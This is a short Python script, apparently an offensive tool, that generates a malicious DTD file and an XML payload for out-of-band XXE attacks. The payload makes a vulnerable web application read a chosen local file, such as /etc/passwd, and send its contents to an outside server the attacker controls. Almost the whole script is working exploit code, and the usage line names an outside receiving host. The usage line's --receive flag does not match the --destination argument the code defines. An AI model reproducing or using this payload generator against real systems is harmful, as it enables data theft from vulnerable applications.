#!/usr/bin/env python

"""
Author: ANDRE LUIS ALBINO DE MORAES MARQUES
Date: 2018-02-13

Craft a DTD file to exfiltrate data from a web-application vulnerable to XXE.

Usage: ./craft_dtd.py --resource '/etc/passwd' --receive 'http://watchergp.com:80'

"""

import random
import string
import argparse

charset = string.letters + "0123456789"

def random_name(n=8):
    name = ""
    while len(name) < n:
        name += random.choice(charset)
    return name

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--resource", help="Remote resource to be exfiltrated.", required=True, type=str)
    parser.add_argument("--destination", help="Remote server to send the exfiltrated data.", required=True, type=str)
    args = parser.parse_args()
    dtd = """<!ENTITY % p1 SYSTEM "file:///RESOURCE">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://DESTINATION/BLAH?%p1;'>">
%p2;"""

    dtd_file = random_name() + ".dtd"
    f = open(dtd_file, "wb")
    dtd = dtd.replace("RESOURCE", args.resource)
    dtd = dtd.replace("DESTINATION", args.destination)
    f.write(dtd)
    f.close()
    print("[+] Exfiltration dtd payload of size {0} written to file '{1}'.".format(len(dtd), dtd_file))

    print "To exfiltrate the data, send this XML entity to the vulnerable application, while hosting the above DTD file at your destination server: "
    xxe = """<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{0}/{1}">
<foo>&e1;</foo>""".format(args.destination, dtd_file)
    print xxe
    return 0

if __name__ == "__main__":
    main()
